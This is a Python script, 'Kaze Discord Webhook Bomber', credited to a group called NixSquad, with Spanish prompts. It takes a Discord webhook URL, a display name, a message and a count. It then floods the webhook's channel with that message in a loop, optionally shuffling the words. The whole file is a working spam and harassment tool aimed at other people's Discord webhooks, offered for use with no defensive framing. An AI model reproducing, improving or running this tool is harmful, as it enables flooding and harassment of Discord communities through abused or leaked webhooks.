#===== Kaze Discord Webhook Bomber
#===== O$int#0800
#===== NixSquad
#===== https://nixsquad.py/
#====================================

#<--------------Imports Start & Loading Start-------------->

import time
import os
from colorama import *
from discord_webhook import DiscordWebhook
import random
import string
#<--------------Defs-------------->
wrong = f"{Fore.RED}[{Fore.WHITE}-{Fore.GREEN}] {Fore.LIGHTWHITE_EX}"
#<--------------Leave-------------------->
def leave():
    clear()
    banner()
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Gracias por usar Kaze!")
    time.sleep(1)
#<--------------Clear command-------------------->
def clear():
    if(os.name == "nt"):
        os.system('cls')
    else:
        os.system('clear')
#<--------------Failed-------------------->
def fail(fial):
    print(f"{wrong}{Fore.LIGHTYELLOW_EX} {fial}. Inténtelo de nuevo.")
    time.sleep(2.5)
    menu()
#<--------------Interrupt-------------------->
def exit():
    print("")
    print("")
    print(f'{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} ¡Has presionado ctrl + c!')
    time.sleep(2.5)
    leave()
#<--------------Banner-------------->
def banner():
    print(f"""{Fore.LIGHTYELLOW_EX}

    `7MMF' `YMM'                          
       MM   .M'                            
       MM .d"      ,6"Yb.  M\"""MMV .gP"Ya  
       MMMMM.     8)   MM  '  AMV ,M'   Yb 
       MM  VMA     ,pm9MM    AMV  8M\"""\""" 
       MM   `MM.  8M   MM   AMV  ,YM.    , 
    .JMML.   MMb.`Moo9^Yo.AMMmmmM `Mbmmd'  
""")
    print(f"{Fore.LIGHTYELLOW_EX}       https:// {Fore.RESET}{Fore.LIGHTRED_EX}n i x s q u a d . {Fore.LIGHTYELLOW_EX}py /{Fore.RESET}")
    print("")
#<--------------Main-------------->
def menu():
    clear()
    banner()
    os.system('@title Kaze Discord Webhook Bomber by O$int #NixsQuad')
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]     Dev:{Fore.RESET} O{Fore.LIGHTRED_EX}${Fore.RESET}int {Fore.LIGHTRED_EX}<3")
    print("")
    print("")
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]      Ingrese el webhook a explotar: ", end=f"{Fore.RESET}")
    hook = input()
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]      Ingrese el nombre del webhook: ", end=f"{Fore.RESET}")
    hookname = input()
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]      Ingrese el mensaje a enviar: ", end=f"{Fore.RESET}")
    mensaje = input()
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]      Ingrese el numero de mensajes a enviar: ", end=f"{Fore.RESET}")
    nan = input()
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]      ¿Desea desordenar los parámetros otorgados? [y/N]: ", end=f"{Fore.RESET}")
    yn = input()
    if nan.isdigit():
        if yn == "y":
            valor = 0
            while valor < int(nan):
                spl = mensaje.split(' ')
                try:
                    spl2 = " ".join(random.choices(spl, k=len(spl)))
                    re = DiscordWebhook(url=hook, content=spl2, username=hookname)
                    re.execute()
                    valor += 1
                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET}      {valor} mensajes enviados")
                except KeyboardInterrupt:
                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]{Fore.RESET}      ¡Bombing terminado!")
                    time.sleep(2)
                    menu()
                except:
                    fail("Webhook inválida")
            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]{Fore.RESET}      ¡Bombing terminado!")
            time.sleep(2)
            menu()
        else:
            valor = 0
            while valor < int(nan):
                try:
                    re = DiscordWebhook(url=hook, content=mensaje, username=hookname)
                    re.execute()
                    valor += 1
                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} {valor} mensajes enviados")
                except KeyboardInterrupt:
                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]{Fore.RESET}      ¡Bombing terminado!")
                    time.sleep(2)
                    menu()
                except:
                    fail("Webhook inválida")
            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}${Fore.LIGHTYELLOW_EX}]{Fore.RESET}      ¡Bombing terminado!")
            time.sleep(2)
            menu()
    else:
        fail("Parámetro inválido")

try:
    menu()
except KeyboardInterrupt:
    exit()




